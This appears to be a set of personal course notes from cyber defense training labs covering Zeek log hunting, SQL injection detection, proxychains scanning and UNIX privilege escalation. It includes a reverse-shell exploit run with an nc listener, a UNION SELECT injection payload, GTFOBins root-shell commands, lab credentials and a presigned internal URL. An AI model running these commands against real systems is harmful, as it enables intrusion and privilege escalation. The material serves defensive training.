Run the following query to filter for only Zeek connection logs.

event.dataset:conn

Toggle the following fields:

source.ip 

destination.ip 

destination.port 

connection.state

client.packets

server.packets


![image](https://github.com/user-attachments/assets/5df234ea-0198-4c45-8c6b-01dcd9a5a0fd)



Run the following query to search for scanning behavior:

event.dataset:conn and source.ip:199.63.64.51 and ((client.packets>=1 and client.packets<=3) and server.packets<=1)

![image](https://github.com/user-attachments/assets/931358f3-7636-4ea6-8b85-a4ea435b861e)


Filter for HTTP logs by running the following query:

event.dataset:http

Toggle the following fields:

source.ip

destination.ip

http.status_code

http.uri

http.request.body.length

http.response.body.length


![image](https://github.com/user-attachments/assets/f9b0dd53-f275-42c3-a4b9-28569e052cc6)


run the following query to filter out web connections from different hosts:

event.dataset:http and source.ip:199.63.64.51

notice the stranges uri's

![image](https://github.com/user-attachments/assets/87f37e22-f64f-485c-9d29-dd33a878a1ec)


#### CDAH-M7L2 Finding and Using an Exploit #### 

Run the following command to search for exploits related to OpenSSH:
(trainee@dmss-kali)-[~] $ searchsploit openssh

Run the following command to search for exploits related to Wekzeug HTTPD:
(trainee@dmss-kali)-[~] $ searchsploit wekzeug

 Run the following command to search for exploits related to LogonTracer:
(trainee@dmss-kali)-[~] $ searchsploit logontracer

Run the following command to find the full path of the exploit. -p specifies the full path given an exploit ID and copies it to the clipboard, if possible.
(trainee@dmss-kali)-[~] $ searchsploit -p 49918

Run the following command to read the exploit script:
(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py

Run the following command to print the exploit script's help menu:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py -h

 Start a listener before running the exploit, as the exploited host needs something to call back to. The port is somewhat arbitrary. In this case, 4444 is used.
(trainee@dmss-kali)-[~] $ nc -nlvp 4444

Open a new tab or window, and run the following command to run the exploit:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py 199.63.64.51 4444 http://200.200.200.10:8080

Run a command to check the functionality of the shell.
(trainee@dmss-kali)-[~] $ /usr/local/src/LogonTracer # whoami

---------------------------------------------------------

![image](https://github.com/user-attachments/assets/a074d8d5-bc35-43dc-9528-4ea5bbd62ca5)


-------------------------------------------------------------------

CDAH-M7L3 Web Application Attacks

 look for union in certain logs

search for UNION+SELECT
![image](https://github.com/user-attachments/assets/0447e933-1ad4-4384-82cc-db9f5592d149)

Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 

also search for script and get time stamp

![image](https://github.com/user-attachments/assets/21dac7be-1a4b-43a2-9f11-b812367e8cbc)


![image](https://github.com/user-attachments/assets/fb413ff3-19b2-4871-b637-4b0c5406cb85)

![image](https://github.com/user-attachments/assets/a9d396e2-226a-489b-a198-6993424be159)



![image](https://github.com/user-attachments/assets/fae52e80-3474-40e9-9636-c0e20490ea1e)


![image](https://github.com/user-attachments/assets/0b048432-e84c-4c85-b6eb-dca6fe9b9567)

![image](https://github.com/user-attachments/assets/5a50dbea-4301-4297-904d-88933600caaf)


![image](https://github.com/user-attachments/assets/874b775c-34ba-48f6-8dbe-786c2a6b402f)

![image](https://github.com/user-attachments/assets/3dd4c9a2-a67f-4a2f-a2bd-449ac9389932)

![image](https://github.com/user-attachments/assets/1bad4db4-39e3-4bc2-985a-dd73231d6a97)

![image](https://github.com/user-attachments/assets/a31ad09d-68e1-41bb-8323-57b0e8034fc4)

SQLI 12:39:14 Attack Query
The following query was executed by the adversary:

'UNION ALL SELECT current_user(),user() #
﻿

NOTE: The use of the ', UNION, and # should immediately tip off the analyst. As demonstrated and discussed throughout the lesson, these characters are used to exploit a web application's design and gain access to otherwise protected information.  

![image](https://github.com/user-attachments/assets/6a87e0ae-bcc7-4d95-b563-a95b1279b3df)

Information Obtained
The SQLI attack on the network helped the adversary gain information about the current database user. This information contains portions of the user's credentials. The credential information obtained may lead the adversary to perform other types of attacks in an attempt to break into the user's account. To mitigate this attack, measures to sanitize input in the network application portal must be enacted. 


----------------------------------------------------

########### CDAH-M7L4 Stack Exploitation ############


####### CDAH-M7L6 Credential Stuffing/Password Cracking #######

GPO -> default domain -> settings -> security settings -> account policies/password policy

CDAH-M7L7 Using an Attack Proxy

In order to save time, only the top 25 ports are scanned.

nmap -Pn --top-ports 25 128.0.7.25

![image](https://github.com/user-attachments/assets/5ef6383a-d07b-4aef-ab28-2507fb92c6aa)

Create a dynamic SSH tunnel between the attacker machine and a peer device that has been co-opted for use in this reconnaissance campaign.

ssh -D 0.0.0.0:9050 -N -f trainee@128.0.7.207

![image](https://github.com/user-attachments/assets/adf25577-a15b-49ed-9c27-a56e741a242f)


Execute the same scan again, but this time, direct all traffic through the proxy SOCKS4 created by the SSH tunnel.

proxychains nmap -Pn --top-ports 25 128.0.7.25


![image](https://github.com/user-attachments/assets/1800679c-659d-47ed-a69a-4c6729938d64)


CDAH-M8L4-Persisting in Windows Artifacts


HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce



#### CDAH-M9L3-UNIX Privilege Escalation ####


GTFOBins
GTFOBins is a curated list of UNIX binaries that can exploit common misconfigurations to gain elevated privileges.

﻿

Although GTFOBins was made for pentesters to reference ways to perform privilege escalation while living off the land, it is also quite useful for defenders. GTFOBins is used to reference the commands used by adversaries to escalate privileges and hunt for their usage in logs.

﻿

A defender performing a routine audit on their UNIX systems can use GTFOBins to check different binaries found in the sudoers file or that have the Set User Identification (SUID) or Set Group Identification (SGID) bits set.

﻿

Figure 9.3-2 shows the GTFOBins page for the find binary. Privilege escalation is possible with find if the SUID is set or if the user has the ability to run find using sudo. If the user has a restricted shell, they may be able to break out using find.

﻿
![image](https://github.com/user-attachments/assets/659e173d-1391-4ce5-9f87-33879a79fe90)


Sudo
Sudo — sometimes referred to as Superuser Do! — can be misused by adversaries to gain elevated privileges. This is not due to vulnerabilities in sudo but, rather, to configuration options sudo provides for users to be allowed to run only certain applications with elevated privileges.

﻿

The command sudo -l shows a user which binaries the current user has the permission to run using sudo (a specific user can be specified with the -U user option). Once the list of binaries is obtained via sudo -l, a quick search on GTFOBins provides the adversary with available privilege escalation methods.

﻿

Figure 9.3-3 provides example output of sudo -l, where the user sam has the ability to run find, less, and vim using sudo without being prompted for a password.

﻿
![image](https://github.com/user-attachments/assets/556bd1ae-e63e-45ac-be7a-c8c5e5c64fcb)

A search on GTFOBins for “find” returns the privilege escalation methods available for that command. In this case, running the following command is one option to escalate privileges to root:
sudo find . -exec /bin/sh \; -quit

![image](https://github.com/user-attachments/assets/4cafb84a-3372-4603-b429-74bc7806e5ae)

less and vim can also be used for privilege escalation in this case.


For less, the following command will escalate privileges to root:
sudo less /etc/profile
!/bin/sh



For vim, the following command will escalate privileges to root:
sudo vim -c ':!/bin/sh'



Multiple commands thus far have contained !/bin/sh. !/bin/sh can be used as a catchall Security Information and Event Management (SIEM) search to hunt for most of these basic privilege escalation commands. However, an adversary may know that and use other methods to be stealthier.


For example, the following command also escalates privileges using vim but without using the !/bin/sh string in the command. The !/bin/sh string is also found in many standard scripts that may return as false-positive results for the analyst to analyze and exclude.
sudo vim
:shell


SUID and SGID
SUID and SGID are features of UNIX permissions that allow a binary to be configured to always run in the context of the owner or group of the file rather than of the user who ran the binary. Adversaries abuse binaries where the SUID or SGID bits are set. Setting these privileges opens up the potential for privilege escalation, privileged file reads, and privileged file writes. An adversary finds such binaries by running a search using the find command.

﻿

The following command returns all files with the SUID bit set:

find / -type f -perm -04000 -ls 2>/dev/null
﻿

The following command returns all files with the SGID bit set:

find / -type f -perm -02000 -ls 2>/dev/null


![image](https://github.com/user-attachments/assets/4680eaab-9946-4d20-8452-747a90c58a13)

he path /usr/libexec/platform-python3.6 is where CentOS stores the platform-specific python3 binary. According to the Fedora Project, “Platform Python will be a separate stack of Python packages aimed to provide all necessary dependencies.”


/usr/bin/python3 is a string of links that eventually lead to /usr/libexec/platform-python3.6, as shown in Figure 9.3-6.

![image](https://github.com/user-attachments/assets/a215dc32-6ed7-453c-9a4f-06c99b960e07)

Searching the files on GTFOBins helps the adversary know which files can be used to get them closer to privilege escalation. In this case, /usr/libexec/platform-python3.6 has the SUID bit set. This is enough to allow for privilege escalation using the following command:
./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'



Below is a breakdown of the Python command:
./python3 executes the python3 binary.
-c tells Python that a command is going to be executed.
The single quotes encapsulate the command.
import os tells Python to import the os module.
os.execl is the execl function that executes a new program.
"/bin/sh" is the path.
"sh" and "-p" are the arguments to spawn a shell.

![image](https://github.com/user-attachments/assets/4c63feb7-a209-4609-aa49-34b3cc1d0bc7)

Not all binaries are able to do direct privilege escalation. Some only allow for file reads or writes as the privileged user. If file read or write is allowed, the adversary uses that to perform privilege escalation via a script.

----------------------------------


Finding and Testing Privilege Escalation Methods in UNIX
Understanding how adversaries perform privilege escalation is extremely valuable for a CPT analyst. The CPT analyst can not only perform better hunts but also more effectively test privilege escalation methods to ensure fixes are successful.

﻿

1. Log in to the kali-hunt Virtual Machine (VM) using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the terminal.

﻿

3. Use the Secure Shell (SSH) protocol to connect to the ch-dev-cent VM:

(trainee@dmss-kali)-[~] $ ssh sam@ch-dev-cent
sam@ch-dev-cent's password: CyberTraining1!
﻿

4. Check if there are any binaries the user is allowed to run using sudo.

[sam@centos ~]$ sudo -l

![image](https://github.com/user-attachments/assets/60f3d33a-4586-4499-b42c-3b2172d3b577)

5. Search for all three binaries on the GTFOBins GitHub page. According to GTFOBins, find, less, and vim all have privilege escalation methods available with SUID or sudo privileges. The commands to escalate privileges using find, less, and vim, respectively, are as follows:
sudo find . -exec /bin/sh \; -quit

sudo less /etc/profile
!/bin/sh

sudo vim -c ':!/bin/sh'



6. Enter the following command to escalate privileges using the find command:
[sam@centos ~]$ sudo find . -exec /bin/sh \; -quit

![image](https://github.com/user-attachments/assets/75cbc8d7-6245-47c7-858d-eadd181e9a0a)

7. Verify that privilege escalation was successful by running the id command after the privilege escalation attempt:
sh-4.4# id

https://rcs08-minio.pcte.mil/portal-bucket/portal/learning-server/rich-content-images/839aa93f-f5ba-44fe-afed-9855cadad8a0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=PCTE-SimSpaceCorp%2F20250617%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250617T000000Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=cd66258410214def666ff0b14601a7c78037e4b5e3b58b1aeaaa785ec7edfd99

8. Find evidence of the privilege escalation activity in /var/log/secure:
sh-4.4# cat /var/log/secure | grep /bin/sh

![image](https://github.com/user-attachments/assets/0974ee4c-a6b6-491a-a342-0d3ad277de3a)


9. Use the exit command to leave the privileged shell and return to the sam user shell:
sh-4.4# exit

10. Escalate privileges using the less and vim commands from step 5.


Note that after exiting the privileged shells gained in the above step both less and vim will still be running. Each of those processes must be exited to return to the original shell command prompt.


Escalating privileges on UNIX systems can be quite simple when the right misconfigurations are in place. Systems must be monitored and audited often to ensure such misconfigurations do not occur on systems and lead to simple escalation paths for adversaries.

------------------------------------

























































